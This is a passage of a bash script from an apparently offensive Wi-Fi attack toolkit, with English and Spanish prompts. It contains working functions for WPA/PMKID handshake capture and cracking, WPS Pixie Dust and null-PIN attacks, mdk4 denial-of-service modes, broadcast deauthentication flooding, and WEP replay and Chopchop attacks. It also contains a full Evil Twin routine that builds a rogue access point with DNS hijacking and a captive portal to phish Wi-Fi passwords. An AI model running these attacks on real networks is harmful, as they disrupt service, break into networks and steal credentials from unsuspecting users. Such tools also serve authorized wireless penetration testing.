      color_output_no_line "*" "Do you want to crack the PMKID handshakes? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read crack_option
    else
      handshake_total=$(wc -l "/opt/wef/main/captures/${name}/pmkid_hashes" | awk '{print $1}')
      color_output "*" "${handshake_total} handshakes almacenados en /opt/wef/main/captures/${name}/pmkid_hashes"
      color_output_no_line "*" "Quieres crackear los handshakes PMKID? [${yC}s${blueC}/${yC}n${blueC}]: ${endC}" && read crack_option
    fi

  else
    if [ "$lang" == "en" ]; then
      color_output "*" "No PMKID handshakes captured"
    else
      color_output "*" "No se han capturado handshakes PMKID"
    fi
  fi
  
  if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ] || [ "$crack_option" == "s" ] || [ "$crack_option" == "si" ]; then
    pmkid_crack
  elif [ "$crack_option" == "exit" ] || [ "$crack_option" == "quit" ]; then
    ctrl_c
  else
    reset_info
    keep_exit
  fi
}

# Passive WPA Capture attack
function passive_capture_attack(){
  clear
  check_ap_list # Show APs info or scan APs if it hasn't been done
  log_back_to_menu

  ask_essid
  if [ "$name" == "back" ]; then
    return
  fi
  parse_info

  default="5m"
  ask_time
  if [ "$attack_time" == "back" ]; then
    return
  fi

  clear
  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting passive WPA handshake capture attack, press Ctrl + C if you want to stop it"
  else
    progress_bar 2 0.2 "*" "Comenzando ataque pasivo de captura de handshake WPA, presiona Ctrl + C si quieres pararlo"
  fi

  check_and_create "/opt/wef/main/captures/${name}"
  cap_date=$(date +"%Y-%m-%d-%H-%M-%S")
  cap_name="${cap_date}-capture"

  xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Airodump-ng" -e "airodump-ng -c ${channel} -w \"/opt/wef/main/captures/${name}/${cap_name}\" --essid \"${name}\" ${netCard}" 2>/dev/null & # Escape double quotes to avoid errors
  passive_PID=$!

  sleep "${attack_time}" # Sleep for the asked time
  kill -9 ${passive_PID} 2>/dev/null; wait ${passive_PID} 2>/dev/null # Kill background process

  report-gen
  log_completed
  if [ "$lang" == "en" ]; then
    color_output "*" "Capture saved in /opt/wef/main/captures/${name}/${cap_name}-01.cap"
  else
    color_output "*" "Captura guardadas en /opt/wef/main/captures/${name}/${cap_name}-01.cap"
  fi

  c_h="true"
  check_captured_handshakes
  if [ "$(check_handshake)" -gt "0" ]; then
    ask_to_crack_handshakes
  fi

  if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ] || [ "$crack_option" == "s" ] || [ "$crack_option" == "si" ]; then
    handshake_crack
  else
    reset_info
    keep_exit
  fi
}

# Michael Shutdown Exploitation Attack
function michael_attack(){
  clear
  check_ap_list # Show APs info or scan APs if it hasn't been done
  log_back_to_menu

  ask_essid
  if [ "$name" == "back" ]; then
    return
  fi
  
  default="120s"
  ask_time
  if [ "$attack_time" == "back" ]; then
    return
  fi
  parse_info

  clear
  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting Michael Exploitation attack, press Ctrl + C if you want to stop it"
  else
    progress_bar 2 0.2 "*" "Comenzando ataque Michael Exploitation, presiona Ctrl + C si quieres pararlo"
  fi

  if [[ $verbose == 0 ]]; then
    mdk4 ${netCard} m -t ${ap_mac} -j &>/dev/null &
    mdk4_PID=$!
    sleep "${attack_time}"
    kill -9 ${mdk4_PID} 2>/dev/null; wait ${mdk4_PID} 2>/dev/null
  elif [[ $verbose == 1 ]]; then
    echo
    mdk4 ${netCard} m -t ${ap_mac} -j &
    mdk4_PID=$!
    sleep "${attack_time}"
    kill -9 ${mdk4_PID} 2>/dev/null; wait ${mdk4_PID} 2>/dev/null
    echo
  fi

  report-gen
  log_completed
  reset_info
  keep_exit
}

# WIDS Confusion attack (MDK4)
function wids_confusion(){
  clear
  check_ap_list
  log_back_to_menu

  ask_essid
  if [ "$name" == "back" ]; then
    return
  fi
  parse_info

  default="120s"
  ask_time
  if [ "$attack_time" == "back" ]; then
    return
  fi

  if [ "$lang" == "en" ]; then
    color_output_no_line "*" "Do you want to activate the Zero_Chaos' WIDS exploit? (default=no) [${yC}y${blueC}/${yC}n${blueC}]: " && read zero_chaos
  else
    color_output_no_line "*" "Quieres activar el exploit de WIDS Zero_Chaos? (por defecto=no) [${yC}s${blueC}/${yC}n${blueC}]: " && read zero_chaos
  fi

  if [ "$zero_chaos" == "y" ] || [ "$zero_chaos" == "yes" ] || [ "$zero_chaos" == "s" ] || [ "$zero_chaos" == "si" ]; then
    zero_chaos="true"
  elif [ "$zero_chaos" == "back" ]; then
    return
  fi

  clear
  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting WIDS Confusion attack, press Ctrl + C if you want to stop it"
  else
    progress_bar 2 0.2 "*" "Comenzando ataque de Confusión WIDS, presiona Ctrl + C si quieres pararlo"
  fi

  if [ "$zero_chaos" != "true" ] && [[ $verbose == 0 ]]; then
    mdk4 ${netCard} w -e "${name}" -c ${channel} &>/dev/null &
  elif [ "$zero_chaos" == "true" ] && [[ $verbose == 0 ]]; then
    mdk4 ${netCard} w -e "${name}" -c ${channel} -z &>/dev/null &
  elif [ "$zero_chaos" != "true" ] && [[ $verbose == 1 ]]; then
    mdk4 ${netCard} w -e "${name}" -c ${channel} &
  elif [ "$zero_chaos" == "true" ] && [[ $verbose == 1 ]]; then
    mdk4 ${netCard} w -e "${name}" -c ${channel} -z &
  fi

  mdk4_PID=$!
  sleep "${attack_time}"
  kill -9 ${mdk4_PID} 2>/dev/null; wait ${mdk4_PID} 2>/dev/null

  report-gen
  log_completed
  reset_info
  keep_exit
}

# WPS Pixie Dust Attack
function pixie_dust(){
  clear
  check_ap_list # Show APs info or scan APs if it hasn't been done
  log_back_to_menu

  ask_essid
  if [ "${name}" == "back" ]; then
    return
  fi
  parse_info

  default="60s"
  ask_time
  if [ "${attack_time}" == "back" ]; then
    return
  fi

  clear
  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting Pixie Dust attack, press Ctrl + C if you want to stop it"
  else
    progress_bar 2 0.2 "*" "Comenzando ataque Pixie Dust, presiona Ctrl + C si quieres pararlo"
  fi

  if [ $verbose == 0 ]; then
    reaver -i "${netCard}" -b "${ap_mac}" -c "${channel}" -K 1 -v -g 3 &
    reaver_PID=$!
  elif [ $verbose == 1 ]; then
    reaver -i "${netCard}" -b "${ap_mac}" -c "${channel}" -K 1 -vv -g 3 &
    reaver_PID=$!
  fi
  sleep "${attack_time}"
  kill -9 ${reaver_PID} 2>/dev/null; wait ${reaver_PID} 2>/dev/null

  report-gen
  log_completed
  reset_info
  keep_exit
}

# Null Pin Attack
function null_pin(){
  clear
  check_ap_list # Show APs info or scan APs if it hasn't been done
  log_back_to_menu

  ask_essid
  if [ "$name" == "back" ]; then
    return
  fi
  parse_info

  default="40s"
  ask_time
  if [ "$attack_time" == "back" ]; then
    return
  fi

  clear
  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting Null Pin attack, press Ctrl + C if you want to stop it"
  else
    progress_bar 2 0.2 "*" "Comenzando ataque de Pin nulo"
  fi

  # Perform attack
  reaver -i "${netCard}" -b "${ap_mac}" -c "${channel}" -f -N -g 2 -vv -p '' &
  reaver_PID=$!
  sleep "${attack_time}"
  kill -9 ${reaver_PID} 2>/dev/null; wait ${reaver_PID} 2>/dev/null
	
  report-gen
  log_completed
  reset_info
  keep_exit
}

# Caffe Latte Attack
function caffe_latte(){
  clear
  check_ap_list # Show APs info or scan APs if it hasn't been done
  log_back_to_menu
  
  ask_essid
  if [ "$name" == "back" ]; then
    return
  fi
  parse_info
  
  default="180s"
  ask_time
  if [ "$attack_time" == "back" ]; then
    return
  fi

  clear
  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting CaffeLatte attack, press Ctrl + C if you want to stop it"
  else
    progress_bar 2 0.2 "*" "Comenzando ataque CaffeLatte, presiona Ctrl + C si quieres pararlo"
  fi

  check_and_create "/opt/wef/main/captures/${name}"
  xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Airodump-ng" -e "airodump-ng -c ${channel} -w /opt/wef/main/captures/${name}/CaffeLatte ${netCard}" 2>/dev/null &
  air_PID=$!

  timeout ${attack_time} bash -c "airbase-ng -c ${channel} --essid \"${name}\" ${netCard} -L -x 100"
  sleep 0.2
  kill -9 ${air_PID} 2>/dev/null; wait ${air_PID} 2>/dev/null

  report-gen
  log_completed

  if [ "$lang" == "en" ]; then
    color_output_ln "*" "Capture saved in /opt/wef/main/captures/${name}/${cap_name}-01.cap"
  else
    color_output_ln "*" "Captura guardada en /opt/wef/main/captures/${name}/${cap_name}-01.cap"
  fi

  reset_info
  keep_exit
}

# Chopchop Attack
function chopchop(){
  clear
  check_ap_list # Show APs info or scan APs if it hasn't been done
  log_back_to_menu

  ask_essid
  if [ "$name" == "back" ]; then
    return
  fi
  parse_info

  clear
  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting Chopchop attack, press Ctrl + C if you want to stop it"
  else
    progress_bar 2 0.2 "*" "Comenzando ataque Chopchop, presiona Ctrl + C si quieres pararlo"
  fi
  
  echo
  aireplay-ng -4 -d ${ap_mac} -e "${name}" ${netCard}

  report-gen
  log_completed
  reset_info
  keep_exit
}

# Replay Attack
function replay(){
  clear
  check_ap_list # Show APs info or scan APs if it hasn't been done
  log_back_to_menu

  ask_essid
  if [ "$name" == "back" ]; then
    return
  fi
  parse_info

  default="180s"
  ask_time
  if [ "$attack_time" == "back" ]; then
    return
  fi

  if [ "$lang" == "en" ]; then
    echo -e "\n${blueC}Speed of the attack:${endC}"
    color_output "1" "Fast"
    color_output "2" "Normal\n"
    color_output_no_line "*" "Select an option (default=normal): " && read speed_option
  else
    echo -e "\n${blueC}Velocidad del ataque:${endC}"
    color_output "1" "Rapido"
    color_output "2" "Normal\n"
    color_output_no_line "*" "Selecciona una opción (por defecto=normal): " && read speed_option
  fi

  if [ "$speed_option" == "1" ]; then
    if [ "$lang" == "en" ]; then
      color_output_ln "*" "Increasing the amount of IVs..."
    else
      color_output_ln "*" "Incrementando la cantidad de IVs..."
    fi
    timeout 120 bash -c "aireplay-ng -1 0 -e ${name} -d ${ap_mac} ${netCard} &>/dev/null"
  fi; sleep 0.2

  clear
  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting Replay attack, press Ctrl + C if you want to stop it"
  else
    progress_bar 2 0.2 "*" "Comenzando ataque de Replay, presiona Ctrl + C si quieres pararlo"
  fi

  check_and_create "/opt/wef/main/captures/${name}"
  cap_date=$(date +"%Y-%m-%d-%H-%M-%S")
  cap_name="${cap_date}-capture"
  xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Airodump-ng" -e "airodump-ng -c ${channel} -w \"/opt/wef/main/captures/${name}/${cap_name}\" --essid \"${name}\" ${netCard}" 2>/dev/null &
  air_PID=$!

  aireplay-ng -3 -b ${ap_mac} ${netCard} 2>/dev/null &
  replay_PID=$!

  sleep "${attack_time}"
  kill -9 ${replay_PID} 2>/dev/null; wait ${replay_PID} 2>/dev/null
  sleep 2
  kill -9 ${air_PID} 2>/dev/null; wait ${air_PID} 2>/dev/null

  report-gen
  log_completed
  reset_info
  keep_exit
}

# Inhibitor Function
function inhibitor(){
  trap inhibition_c INT # Change Ctrl + C keyboard interrupt function

  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Getting AP channel"
  else
    progress_bar 2 0.2 "*" "Obteniendo el canal del AP"
  fi

  if [ ! -f "/tmp/.scan_output" ]; then
    check_ap_list
    parse_info
  else
    parse_info
  fi

  iwconfig ${netCard} channel ${channel} # Change interface channel
  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting inhibition"
    color_output_ln "*" "Press Ctrl + C to stop the attack"
  else
    progress_bar 2 0.2 "*" "Comenzando inhibición" 
    color_output_ln "*" "Presiona Ctrl + C para parar el ataque"
  fi

  if [[ $verbose == 0 ]]; then
    aireplay-ng -0 0 -e "${name}" -D -c FF:FF:FF:FF:FF:FF ${netCard} &>/dev/null
  elif [[ $verbose == 1 ]]; then
    echo
    aireplay-ng -0 0 -e "${name}" -D -c FF:FF:FF:FF:FF:FF ${netCard}
    echo
  fi

  if [ "$lang" == "en" ]; then
    good_output_ln "+" "Inhibition completed"
  else
    good_output_ln "+" "Inhibición completada"
  fi
}




#
# Evil Twin attack functions
#

function setup_interface_eviltwin(){
  if [ "$evil_option" == "2" ] || [ "$evil_option" == "4" ]; then
    if hash rfkill 2> /dev/null; then
      rfkill unblock all > /dev/null 2>&1
    fi

    ip link set "${evilCard}" down
    iw "${evilCard}" set monitor control
    # Check MAC spoofing
    if [ "$mac_spoof" == "y" ] || [ "$mac_spoof" == "yes" ] || [ "$mac_spoof" == "s" ] || [ "$mac_spoof" == "si" ]; then
      macchanger -m "${ap_mac}" ${evilCard} &>/dev/null
    fi
    ip link set "${evilCard}" up

    rand_mac=$(generate_rand_mac)
    iw "${evilCard}" interface add "mon${evilCard}" type monitor addr ${rand_mac}; sleep 0.3

  else
    ifconfig "${evilCard}" down
    iwconfig "${evilCard}" mode monitor
    # Check MAC spoofing
    if [ "$mac_spoof" == "y" ] || [ "$mac_spoof" == "yes" ] || [ "$mac_spoof" == "s" ] || [ "$mac_spoof" == "si" ]; then
      macchanger -m "${ap_mac}" ${evilCard} &>/dev/null
    fi
    ifconfig "${evilCard}" up
  fi
}

function restore_interface_eviltwin(){
  if [ "$evil_option" == "2" ] || [ "$evil_option" == "4" ]; then
    iw "mon${evilCard}" del 2>/dev/null; sleep 0.2
  fi

  ifconfig "${evilCard}" down 2>/dev/null; sleep 0.1
  iwconfig "${evilCard}" mode managed 2>/dev/null; sleep 0.1
  ifconfig "${evilCard}" up 2>/dev/null; sleep 0.2
}

function create_lighttpd_conf(){
  { 
  echo -e "server.document-root = \"${portal_path}\"\n"
	echo -e "server.modules = ("
	echo -e "\"mod_auth\","
	echo -e "\"mod_cgi\","
	echo -e "\"mod_redirect\""
	echo -e ")\n"
	echo -e "\$HTTP[\"host\"] =~ \"(.*)\" {"
	echo -e "url.redirect = ( \"^/index.htm$\" => \"/\")"
	echo -e "url.redirect-code = 302"
	echo -e "}"
	echo -e "\$HTTP[\"host\"] =~ \"gstatic.com\" {"
	echo -e "url.redirect = ( \"^/(.*)$\" => \"http://connectivitycheck.google.com/\")"
	echo -e "url.redirect-code = 302"
	echo -e "}"
	echo -e "\$HTTP[\"host\"] =~ \"captive.apple.com\" {"
	echo -e "url.redirect = ( \"^/(.*)$\" => \"http://connectivitycheck.apple.com/\")"
	echo -e "url.redirect-code = 302"
	echo -e "}"
	echo -e "\$HTTP[\"host\"] =~ \"msftconnecttest.com\" {"
	echo -e "url.redirect = ( \"^/(.*)$\" => \"http://connectivitycheck.microsoft.com/\")"
	echo -e "url.redirect-code = 302"
	echo -e "}"
	echo -e "\$HTTP[\"host\"] =~ \"msftncsi.com\" {"
	echo -e "url.redirect = ( \"^/(.*)$\" => \"http://connectivitycheck.microsoft.com/\")"
	echo -e "url.redirect-code = 302"
	echo -e "}"
	echo -e "server.port = 80\n"
	echo -e "index-file.names = ( \"index.htm\" )\n"
	echo -e "server.error-handler-404 = \"/\"\n"
	echo -e "mimetype.assign = ("
	echo -e "\".css\" => \"text/css\","
	echo -e "\".js\" => \"text/javascript\""
	echo -e ")\n"
	echo -e "cgi.assign = ( \".htm\" => \"/bin/bash\" )"
	} >> "/opt/wef/cache/lighttpd.conf"
}

# Use 'sed' with regex to edit template
function create_template(){
  sed -i "s/<span class=\"bold\">.*<\/span>/<span class=\"bold\">${name}<\/span>/" /opt/wef/main/captive-portals/${country_code}-portal/index.htm
  handshake_path=$(echo "${handshake_cap}" | sed 's/\//\\\//g')
  sed -i "26s/.*/aircrack-ng -a 2 -b ${ap_mac} -w \"\/tmp\/www\/ag.et_currentpass.txt\" \"${handshake_path}\" | grep \"KEY FOUND!\" > \/dev\/null/" /opt/wef/main/captive-portals/${country_code}-portal/check.htm
}

function check_eviltwin_password(){
  while true; do
    if [ -f "/tmp/www/ag.et_success.txt" ] && [ "$(cat /tmp/www/ag.et_currentpass.txt)" ]; then
      if [ "$lang" == "en" ]; then
        echo -e "\n\n${blueC}[${greenC}+${blueC}] Correct password obtained: ${yC}$(cat /tmp/www/ag.et_currentpass.txt)${endC}"
        good_output "+" "Password stored in /opt/wef/main/captures/${name}/eviltwin_password.txt"
      else
        echo -e "\n\n${blueC}[${greenC}+${blueC}] Contraseña correcta obtenida: ${yC}$(cat /tmp/www/ag.et_currentpass.txt)${endC}"
        good_output "+" "Contraseña almacenada en /opt/wef/main/captures/${name}/eviltwin_password.txt"
      fi
      cp "/tmp/www/ag.et_currentpass.txt" "/opt/wef/main/captures/${name}/eviltwin_password.txt" 2>/dev/null
      rm -rf "/tmp/www" 2>/dev/null

      sleep 4
      killall xterm hostapd dnsmasq lighttpd 2>/dev/null
      break
    fi
  done
  
  if [ "$lang" == "en" ]; then
    press_enter "Attack finished, press Enter to return to menu "
  else
    press_enter "El ataque ha terminado, presiona Enter para volver al menu "
  fi
}

function check_eviltwin_success(){
  while true; do
    arp_out=$(arp -i ${evilCard} | grep "${evilCard}" | awk '{print $1}')
    arp_len=$(echo ${arp_out} | wc -l)
    echo -e "${blueC}[${yC}*${blueC}] EvilTwin${2}${endC}"
    echo -e "${blueC}------------${endC}"

    if [ "$lang" == "en" ]; then
      if [[ $arp_len == 1 ]] && [ ! "$arp_out" ]; then
        echo -e "${blueC}Total devices: ${yC}0${endC}"
      else
        echo -e "${blueC}Total devices: ${yC}${arp_len}${endC}"
      fi
    else
      if [[ $arp_len == 1 ]] && [ ! "$arp_out" ]; then
        echo -e "${blueC}Dispositivos totales: ${yC}0${endC}"
      else
        echo -e "${blueC}Dispositivos totales: ${yC}${arp_len}${endC}"
      fi
    fi

    if [[ $arp_len != 0 ]] && [ "${arp_out}" ]; then

      if [ "$lang" == "en" ]; then
        echo -e "${blueC}Devices info:${endC}"
      else
        echo -e "${blueC}Información sobre los dispositivos:${endC}"
      fi

      echo -e "${arp_out}"
    fi

    if [ -f "/tmp/www/ag.et_currentpass.txt" ]; then
      if [ "$lang" == "en" ]; then
        echo -e "\n${blueC}Last password tried: ${grayC}$(cat /tmp/www/ag.et_currentpass.txt)${endC}"
      else
        echo -e "\n${blueC}Ultima contraseña probada: ${grayC}$(cat /tmp/www/ag.et_currentpass.txt)${endC}"
      fi
    fi

    if [ -f "/tmp/www/ag.et_success.txt" ]; then
      if [ "$lang" == "en" ]; then
        echo -e "\n${blueC}[${greenC}+${blueC}] Correct password: ${grayC}$(cat /tmp/www/ag.et_currentpass.txt)${endC}${endC}"
      else
        echo -e "\n${blueC}[${greenC}+${blueC}] Contraseña correcta: ${grayC}$(cat /tmp/www/ag.et_currentpass.txt)${endC}${endC}"
      fi
      sleep 5
      break
    fi

    sleep 1; clear
  done
}

# Evil Twin: 1º Hostapd --> 2º Dnsmasq --> 3º Lighttpd --> 4º Deauth (optional)
function evilTwin(){
  clear
  check_ap_list
  log_back_to_menu

  if [ "$lang" == "en" ]; then
    color_output_no_line "*" "Name of AP to supplant: " && read name
  else
    color_output_no_line "*" "Nombre del AP a suplantar: " && read name
  fi

  if [ "$name" == "back" ]; then
    return
  fi
  parse_info
	
  if [ "${channel}" -lt "15" ]; then 
    hw_mode=g # 2.4Ghz
  else
    hw_mode=a # 5Ghz
  fi

  if [ "$lang" == "en" ]; then
    echo -e "${blueC}\nType of attack:${endC}"
  else
    echo -e "${blueC}\nTipo de ataque:${endC}"
  fi
  evil_twin_panel
  echo
  if [ "$lang" == "en" ]; then
    color_output_no_line "*" "Select an option >> " && read evil_option
  else
    color_output_no_line "*" "Selecciona una opción >> " && read evil_option
  fi

  if [ "$evil_option" == "back" ]; then
    return
  fi

  echo
  if [ "$lang" == "en" ]; then
    color_output_no_line "*" "A handshake containing target AP handshake is needed to check if provided password is correct, do you want to continue [${yC}y${blueC}/${yC}n${blueC}]: " && read h_continue
  else
    color_output_no_line "*" "Se necesita un archivo con el handshake del AP objetivo para comprobar si la contraseña es correcta, quieres continuar [${yC}s${blueC}/${yC}n${blueC}]: " && read h_continue
  fi

  if [ "$h_continue" != "y" ] && [ "$h_continue" != "yes" ] && [ "$h_continue" != "s" ] && [ "$h_continue" != "si" ]; then
    return
  fi

  while true; do
    if [ "$lang" == "en" ]; then
      color_output_no_line "*" "Enter path to handshake file: " && read handshake_cap
    else
      color_output_no_line "*" "Introduce la ruta del archivo de handshake: " && read handshake_cap
    fi

    cap_name="${handshake_cap}"
    if [ "${handshake_cap}" == "back" ]; then
      return
    elif [ -f "${handshake_cap}" ]; then
      if [ "$(check_handshakes_in_file)" -gt "0" ]; then
        break
      else
        if [ "$lang" == "en" ]; then
          color_output "X" "File doesn't contains any handshake"
        else
          color_output "X" "El archivo no contiene ningún handshake"
        fi
      fi
    else
      if [ "$lang" == "en" ]; then
        color_output "X" "File doesn't exists"
      else
        color_output "X" "El archivo no existe"
      fi
    fi
  done

  if [ "$lang" == "en" ]; then
    color_output_no_line "*" "Do you want to spoof ${name} BSSID? [${yC}y${blueC}/${yC}n${blueC}]: " && read mac_spoof
  else
    color_output_no_line "*" "Quieres suplantar la BSSID de ${name} [${yC}s${blueC}/${yC}n${blueC}]: " && read mac_spoof
  fi

  check_and_create "/tmp/www"
  if [ "$evil_option" == "2" ] || [ "$evil_option" == "4" ]; then

    if [ "$lang" == "en" ]; then
      if [ "$(check_vif)" ]; then
        good_output "+" "Your network interface seems to support VIF"
      else
        color_output "*" "Your network interface doesn't seem to support VIF"
      fi
      color_output_no_line "*" "To perform the DoS attack while the AP is running, physical card must be split into 2 cards (Virtual Interface). Do you want to continue? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read vif_check
    else
      if [ "$(check_vif)" ]; then
        good_output "+" "Tu interfaz de red parece soportar VIF"
      else
        color_output "*" "Tu interfaz de red no parece soportar VIF"
      fi
      color_output_no_line "*" "Para realizar el ataque DoS mientras el AP esta corriendo, la tarjeta física se debe dividir en 2 (Interfaz Virtual). Quieres continuar? [${yC}s${blueC}/${yC}n${blueC}]: ${endC}" && read vif_check
    fi

    if [ "$vif_check" == "n" ] || [ "$vif_check" == "no" ] || [ "$vif_check" == "back" ]; then
      if [ "$lang" == "en" ]; then
        echo -e "${blueC}Going back to menu...${endC}"; sleep 0.5
      else
        echo -e "${blueC}Volviendo al menu...${endC}"; sleep 0.5
      fi
      return
    fi
  fi

  trap keep_exit_eviltwin INT
  if [ "$lang" == "en" ]; then
    color_output_ln "*" "Configuring interface..."
  else
    color_output_ln "*" "Configurando la interfaz..."
  fi

  # Strange workaround for some interface errors & monitor mode
  airmon-ng stop ${netCard} &>/dev/null; sleep 0.1
  setup_interface_eviltwin

  if [ "$lang" == "en" ]; then
    good_output "+" "Interface configured successfully"
  else
    good_output "+" "Interfaz configurada correctamente"
  fi

  systemctl stop systemd-resolved &>/dev/null
  fuser -k 80/tcp &>/dev/null; sleep 0.1

  kill_network_services=$(awk -F '=' '/airmon_check_kill/ {print $2}' /opt/wef/wef.cnf | awk '{print $1}')
  if [ "${kill_network_services}" == "true" ]; then
    airmon-ng check kill &>/dev/null
  fi

  killall hostapd hostapd-wpe dnsmasq lighttpd xterm dhcpd 2>/dev/null # Kill processes
  rm /opt/wef/cache/hostapd.conf 2>/dev/null
  rm /opt/wef/cache/dnsmasq.conf 2>/dev/null
  rm /opt/wef/cache/lighttpd.conf 2>/dev/null

  while true; do
    languages=$(ls /opt/wef/main/captive-portals | tr "\n" "," | sed 's/,/, /g' | sed 's/, $//' | sed 's/-portal//g' 2>/dev/null)
    if [ "$lang" == "en" ]; then
      echo -e "\n${blueC}Languages:${grayC} ${languages}${endC}"
      color_output_no_line "*" "Select captive portal language you want to use, enter country code (i.e. pt): " && read country_code
    else
      echo -e "\n${blueC}Idiomas:${grayC} ${languages}${endC}"
      color_output_no_line "*" "Selecciona el idioma del portal cautivo a usar, introduce el codigo del país (i.e. pt): " && read country_code
    fi

    if [ "$country_code" == "back" ]; then
      return
    fi

    if [ "$(echo "${languages}" | grep "${country_code}")" ]; then
      break
    else
      if [ "$lang" == "en" ]; then
        color_output_ln "X" "Invalid option!"; sleep 0.1
      else
        color_output_ln "X" "Opción inválida!"; sleep 0.1
      fi
    fi
  done

  portal_path="/opt/wef/main/captive-portals/${country_code}-portal"
  create_lighttpd_conf
  create_template

  ifconfig $evilCard up
  kill_network_services=$(awk -F '=' '/airmon_check_kill/ {print $2}' /opt/wef/wef.cnf | awk '{print $1}')

  if [ "$lang" == "en" ]; then
    press_enter "Some windows will be open, don't close them. Press Enter to continue and launch attack "
  else
    press_enter "Algunas ventanas se abrirán, no las cierres. Presiona Enter para continuar y lanzar el ataque "
  fi

  sleep 3

  # Creating hostapd configuration file
  echo "
interface=${evilCard}
ssid=${name}
hw_mode=${hw_mode}
channel=${channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
ieee80211n=1
wme_enabled=1
driver=nl80211" >> /opt/wef/cache/hostapd.conf

  # Hostapd
  if [ "$evil_option" == "1" ] || [ "$evil_option" == "2" ]; then
    if [ "${kill_network_services}" == "true" ]; then
      # No headless
      xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Hostapd" -e "hostapd /opt/wef/cache/hostapd.conf" 2>/dev/null &
    else
      # Headless
      hostapd /opt/wef/cache/hostapd.conf > /dev/null 2>&1 &
    fi
  elif [ "$evil_option" == "3" ] || [ "$evil_option" == "4" ]; then
    if [ "${kill_network_services}" == "true" ]; then
      # No headless
      xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Hostapd" -e "hostapd-wpe /opt/wef/cache/hostapd.conf" 2>/dev/null &
    else
      # Headless
      hostapd-wpe /opt/wef/cache/hostapd.conf > /dev/null 2>&1 &
    fi
  fi

  sleep 5

  # Creating dnsmasq configuration file
  echo "
interface=${evilCard}
dhcp-range=10.0.221.2,10.0.221.30,255.255.255.0,12h
dhcp-option=3,10.0.221.1
dhcp-option=6,10.0.221.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=10.0.221.1
address=/#/10.0.221.1" >> /opt/wef/cache/dnsmasq.conf

  ifconfig ${evilCard} 10.0.221.1 netmask 255.255.255.0
  route add -net 10.0.221.0 netmask 255.255.255.0 gw 10.0.221.1

  # Dnsmasq
  if [ "${kill_network_services}" == "true" ]; then
    xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Dnsmasq" -e "dnsmasq -C /opt/wef/cache/dnsmasq.conf -d" 2>/dev/null &
  else
    dnsmasq -C /opt/wef/cache/dnsmasq.conf -d > /dev/null 2>&1 &
  fi

  sleep 5

  # Deauth
  if [ "$evil_option" == "2" ] || [ "$evil_option" == "4" ]; then
    iwconfig mon${evilCard} channel ${channel} 2>/dev/null; sleep 0.1
    if [ "${kill_network_services}" == "true" ]; then
      xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Deauth" -e "aireplay-ng -0 0 -c FF:FF:FF:FF:FF:FF --ignore-negative-one -a ${ap_mac} mon${evilCard}" 2>/dev/null &
    else
      aireplay-ng -0 0 -c FF:FF:FF:FF:FF:FF --ignore-negative-one -a ${ap_mac} "mon${evilCard}" > /dev/null 2>&1 &
    fi

    sleep 4
  fi

  # Start web server (Lighttpd)
  if [ "${kill_network_services}" == "true" ]; then
    xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Lighttpd" -e "lighttpd -D -f /opt/wef/cache/lighttpd.conf" 2>/dev/null &
  else
    lighttpd -f /opt/wef/cache/lighttpd.conf > /dev/null 2>&1 &
  fi

  sleep 4

  export -f check_eviltwin_success # Export function
  if [ "${kill_network_services}" == "true" ]; then
    xterm -hold -bg "#000000" -fg "#FFFFFF" -T "EvilTwin" -e "check_eviltwin_success" 2>/dev/null &
  fi

  if [ "$lang" == "en" ]; then
    good_output_ln "+" "Evil Twin attack deployed successfully, when correct password is submitted attack will stop immediately"
    check_eviltwin_password & # This will notify the user is the correct password is provided
    press_enter "Press Enter to continue and finish attack "
  else
    good_output_ln "+" "Ataque Evil Twin desplegado correctamente, cuando se introduzca la contraseña correcta se detendrá el ataque automaticamente"
    check_eviltwin_password & # This will notify the user is the correct password is provided
    press_enter "Presiona Enter para continuar y terminar el ataque "
  fi

  # Attack finish here, restore interface and return to main menu
  rm -rf "/tmp/www" 2>/dev/null
  evil_c
  airmon-ng start "${oldCard}" &>/dev/null
}




#
# Main workflow starts here
#

parameters=("$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" "$9")
export lang="en" # Default language

SHELL="/bin/bash"

config_lang=$(awk -F '=' '/lang/ {print $2}' /opt/wef/wef.cnf | awk '{print $1}')
if [ "$config_lang" == "en" ]; then
  lang="en"
elif [ "$config_lang" == "es" ]; then
  lang="es"
fi

use_colors=$(awk -F '=' '/use_colors/ {print $2}' /opt/wef/wef.cnf | awk '{print $1}')
if [ "$use_colors" == "true" ]; then
  # Define colors and formats
  export greenC="\e[0;32m\033[1m"
  export endC="\033[0m\e[0m"
  export blueC="\e[0;34m\033[1m"
  export yC="\e[0;33m\033[1m"
  export grayC="\e[0;37m\033[1m"
fi

for parameter in ${parameters[@]}; do
  if [ "${parameter}" == "-s" ]; then
    lang="es"
  fi
done

# Main Wifi Function
if [ "$(id -u)" == "0" ]; then

  program_version="1.2"

  while getopts ":i:" arg; do
    case ${arg} in
      i) netCard=$OPTARG;
    esac
